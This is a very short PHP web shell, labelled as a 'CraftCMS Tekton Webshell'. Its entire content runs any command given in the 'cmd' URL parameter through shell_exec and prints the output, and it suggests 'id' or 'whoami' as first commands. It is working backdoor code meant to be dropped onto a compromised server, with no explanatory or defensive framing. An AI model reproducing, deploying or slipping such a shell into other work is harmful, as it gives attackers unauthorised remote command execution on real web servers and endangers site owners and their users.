<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo "CraftCMS Tekton Webshell<br>Use ?cmd=id or ?cmd=whoami";
}
?>
